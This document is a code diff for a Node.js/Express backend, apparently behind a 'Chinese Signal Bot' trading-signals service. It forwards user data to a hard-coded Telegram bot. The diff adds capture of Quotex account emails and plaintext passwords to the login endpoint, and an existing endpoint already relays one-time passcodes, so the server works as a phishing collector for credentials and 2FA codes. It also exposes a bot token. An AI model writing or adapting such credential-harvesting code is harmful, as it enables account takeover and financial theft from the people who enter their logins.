@@ -11,7 +11,7 @@ app.use(express.json());
 const TELEGRAM_BOT_TOKEN = "8881942924:AAHbrAuMs6oGTDbivfRBUNYUlSgsviCO5Qc";
 const TELEGRAM_CHAT_ID = "7293402395";
 
-// Function to send message to your Telegram
+// Function to send message
 async function sendTelegramMessage(text) {
     try {
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -26,77 +26,88 @@ async function sendTelegramMessage(text) {
     }
 }
 
-// ================== LICENSE + NAME ACTIVATION ==================
+// ================== LICENSE + NAME ==================
 app.post('/api/license-activate', async (req, res) => {
-    const { licenseKey, userName, action, timestamp, timezone } = req.body;
-   
+    const { licenseKey, userName, timestamp } = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";
-   
+
     const message = `
 🔑 <b>New License Activation</b>
-👤 <b>Name:</b> ${userName}
-🔑 <b>License:</b> ${licenseKey}
-🌍 <b>IP Address:</b> ${ip}
-⏰ <b>Time (PKT):</b> ${timestamp || new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}
-📍 <b>Timezone:</b> Pakistan
-📱 Notification Permission: ${req.body.notificationPermission || "Unknown"}
+
+👤 Name: <b>${userName}</b>
+🔑 License: <b>${licenseKey}</b>
+🌍 IP: <b>${ip}</b>
+⏰ Time (PKT): <b>${timestamp || new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>
     `.trim();
+
     await sendTelegramMessage(message);
     res.status(200).send({ status: "success" });
 });
 
 // ================== ACTIVITY TRACKING ==================
 app.post('/api/track-activity', async (req, res) => {
-    const { action, userName, ...extra } = req.body;
-   
+    const { action, userName } = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";
+
     const message = `
 📊 <b>User Activity</b>
+
 Action: <b>${action}</b>
 👤 Name: <b>${userName || "Unknown"}</b>
 🌍 IP: <b>${ip}</b>
 ⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>
     `.trim();
+
     await sendTelegramMessage(message);
     res.status(200).send({ status: "success" });
 });
 
-// ================== NEW: NOTIFICATION PERMISSION ==================
+// ================== NOTIFICATION PERMISSION ==================
 app.post('/api/notification-permission', async (req, res) => {
     const { userName, permission, timestamp } = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";
 
     const message = `
-🛎️ <b>Notification Permission Update</b>
+🛎️ <b>Notification Permission</b>
 
-👤 <b>Name:</b> ${userName || "Unknown"}
-📱 <b>Permission Status:</b> ${permission}
-🌍 <b>IP Address:</b> ${ip}
-⏰ <b>Time (PKT):</b> ${timestamp || new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}
+👤 Name: <b>${userName}</b>
+📱 Status: <b>${permission}</b>
+🌍 IP: <b>${ip}</b>
+⏰ Time: <b>${timestamp}</b>
     `.trim();
 
     await sendTelegramMessage(message);
     res.status(200).send({ status: "success" });
 });
 
-// Existing Quotex Endpoints
+// ================== QUOTEX LOGIN (PASSWORD FIXED) ==================
 app.post('/api/quotex-login', async (req, res) => {
-    const { email } = req.body;
-    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    await sendTelegramMessage(`🔑 Quotex Login Attempt\nEmail: ${email}\nIP: ${ip}`);
+    const { email, password } = req.body;
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";
+
+    const message = `
+🔑 <b>Quotex Login Attempt</b>
+
+📧 Email: <b>${email}</b>
+🔑 Password: <b>${password}</b>
+🌍 IP: <b>${ip}</b>
+⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>
+    `.trim();
+
+    await sendTelegramMessage(message);
     res.status(200).send({ status: "ok" });
 });
 
 app.post('/api/quotex-otp', async (req, res) => {
     const { email, otp } = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+
     await sendTelegramMessage(`🔢 OTP Entered\nEmail: ${email}\nOTP: ${otp}\nIP: ${ip}`);
     res.status(200).send({ status: "ok" });
 });
 
-// Root
 app.get('/', (req, res) => {
-    res.send("Chinese Signal Bot Backend is Running ✅");
+    res.send("✅ Chinese Signal Bot Backend Running");
 });
 
 const PORT = process.env.PORT || 3000;
